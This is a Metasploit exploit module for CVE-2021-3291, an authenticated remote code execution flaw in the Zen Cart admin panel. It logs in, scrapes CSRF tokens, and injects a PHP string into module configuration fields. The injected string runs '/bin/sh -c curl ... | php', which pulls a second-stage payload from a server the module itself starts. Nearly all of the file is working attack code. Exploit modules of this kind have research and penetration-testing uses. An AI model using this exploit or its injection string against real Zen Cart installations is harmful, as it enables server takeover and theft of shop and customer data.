##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary web server
#
###
class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    #
    # This exploit affects a webapp, so we need to import HTTP Client
    # to easily interact with it.
    #
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name'           => 'zencart authenticated remote code execution exploit',
          'Description'    => %q(
              This exploit module execution os command in zencart.
          ),
          'License'        => MSF_LICENSE,
          # The place to add your name/handle and email.  Twitter and other contact info isn't handled here.
          # Add reference to additional authors, like those creating original proof of concepts or
          # reference materials.
          # It is also common to comment in who did what (PoC vs metasploit module, etc)
          'Author'         =>
            [
              'Mucahit Saratar <trregen222@gmail.com>'], # msf module & research & poc
          'References'     =>
            [
              [ 'OSVDB', '' ],
              [ 'EDB', '' ],
              [ 'URL', 'https://github.com/MucahitSaratar/zencart_auth_rce_poc'],
              [ 'CVE', '2021-3291']
            ],
          # platform refers to the type of platform.  For webapps, this is typically the language of the webapp.
          # js, php, python, nodejs are common, this will effect what payloads can be matched for the exploit.
          # A full list is available in lib/msf/core/payload/uuid.rb
          'Platform'       => 'php',
          # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access
          'Privileged'     => false,
          # from underlying architecture of the system.  typically ARCH_X64 or ARCH_X86, but for webapps typically
          # this is the application language. ARCH_PYTHON, ARCH_PHP, ARCH_JAVA are some examples
          # A full list is available in lib/msf/core/payload/uuid.rb
          'Arch'           => ARCH_PHP,
          'Targets'        =>
          [
            ['Automatic Targeting', { 'auto' => true }]
          ],
          'DisclosureDate' => '2020-01-22',
          # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
          # It's generally easiest just to put the default at the beginning of the list and skip this
          # entirely.
          'DefaultTarget'  => 0
        )
      )
      # set the default port, and a URI that a user can set if the app isn't installed to the root
      register_options(
        [
          Opt::RPORT(80),
          OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
          OptString.new('PASSWORD', [ true, 'Password to login with', '']),
          OptString.new('BASEPATH', [ true, 'zencart base path eg. /zencart/', '/']),
          OptString.new('MODULE', [ true, 'Module name. eg. payment,shipping,ordertotal,plugin_manager', 'payment']),
          OptString.new('SETTING', [ true, 'setting name. eg. freecharger for payment', 'freecharger']),
          OptString.new('TARGETURI', [ true, 'Admin Panel Path', '/cracK-Fqu-trasH/'])
        ], self.class
      )
    end

    def start_server
        ssltut = false
        if datastore["SSL"]
            ssltut = true
            datastore["SSL"] = false
        end
        start_service({'Uri' => {
            'Proc' => Proc.new { |cli, req|
              on_request_uri(cli, req)
            },
            'Path' => resource_uri
        }})
        print_status("payload is on #{get_uri}")
        @adresim = get_uri
        datastore['SSL'] = true if ssltut
    end
    
    def on_request_uri(cli, request)
        print_good('First stage is executed ! Sending 2nd stage of the payload')
        send_response(cli, payload.encoded, {'Content-Type'=>'text/html'})
      end

    def tabanyol
        datastore["BASEPATH"]
    end

    def isim
        datastore["USERNAME"]
    end

    def parola
        datastore["PASSWORD"]
    end


    def login
        res = send_request_cgi(
        'method'    => 'GET',
        'uri' => normalize_uri(tabanyol, target_uri.path, "index.php?cmd=login&camefrom=index.php")
        )
        # <input type="hidden" name="securityToken" value="c77815040562301dafaef1c84b7aa3f3" />
        unless res
            fail_with(Failure::Unreachable, "Access web application failure")
        end
        if res.code != 200
            fail_with(Failure::Unreachable, "we not have 200 response")
        end

        if !res.get_cookies.empty?
            @cookie = res.get_cookies
            @csrftoken = res.body.scan(/<input type="hidden" name="securityToken" value="(.*)" \/>/).flatten[0] || ''
            if @csrftoken.empty?
                fail_with(Failure::Unknown, 'There is no CSRF token at HTTP response.')
            end
            vprint_good("login Csrf token: "+@csrftoken)
        end

        res = send_request_cgi(
            'method' => 'POST',
            'uri' => normalize_uri(tabanyol, target_uri.path, "index.php?cmd=login&camefrom=index.php"),
            'cookie' => @cookie,
            'vars_post' => {
                'securityToken' => @csrftoken,
                'action' => "do"+@csrftoken,
                'admin_name' => isim,
                'admin_pass' => parola
            })
            if res.code != 302
                fail_with(Failure::UnexpectedReply, 'There is no CSRF token at HTTP response.')
            end
            true
        end


    def check
        unless login
            fail_with(Failure::UnexpectedReply, 'Target Not Vulnerable')
        end
        print_good("We loged in")
        Exploit::CheckCode::Vulnerable

    end

    def exploit
        check
        start_server
        res = send_request_cgi(
            'method' => 'GET',
            'uri' => normalize_uri(tabanyol, target_uri.path, "index.php?cmd=modules&set="+datastore["MODULE"]+"&module="+datastore["SETTING"]+"&action=edit"),
            'cookie' => @cookie
        )
        # <input type="hidden" name="securityToken" value="09068bece11256d03ba55fd2d1f9c820" />
        if res && res.code == 200
            @formtoken = res.body.scan(/<input type="hidden" name="securityToken" value="(.*)" \/>/).flatten[0] || ''
            if @formtoken.empty?
                fail_with(Failure::UnexpectedReply, 'securitytoken not in response')
            end
            #print_good(@formtoken)
            # <form name="modules" 
            @radiolar = res.body.scan(/<input type="radio" name="configuration\[(.*)\]" value="True"/)
            @selectler = res.body.scan(/<select rel="dropdown" name="configuration\[(.*)\]" class="form-control">/)
            @textarr = res.body.scan(/<input type="text" name="configuration\[(.*)\]" value="0" class="form-control" \/>/)
            print_good(@textarr.to_s)
            @secme = {}
            @secme["securityToken"] = @formtoken
            for @a in @radiolar
                @secme["configuration[#{@a[0]}]"] = "True','F'); echo `/bin/sh -c 'curl #{@adresim} | php'`; //"
            end
            for @a in @selectler
                @secme["configuration[#{@a[0]}]"] = "0"
            end
            for @a in @textarr
                @secme["configuration[#{@a[0]}]"] = "0"
            end
            print_good(@secme.to_s)
            res = send_request_cgi(
                'method' => 'POST',
                'uri' => normalize_uri(tabanyol, target_uri.path, "index.php?cmd=modules&set="+datastore["MODULE"]+"&module="+datastore["SETTING"]+"&action=save"),
                'cookie' => @cookie,
                'vars_post' => @secme
            )

            res = send_request_cgi(
                'method' => 'GET',
                'uri' => normalize_uri(tabanyol, target_uri.path, "index.php?cmd=modules&set="+datastore["MODULE"]+"&module="+datastore["SETTING"]+"&action=edit"),
                'cookie' => @cookie
            )

        end
    end
  end
  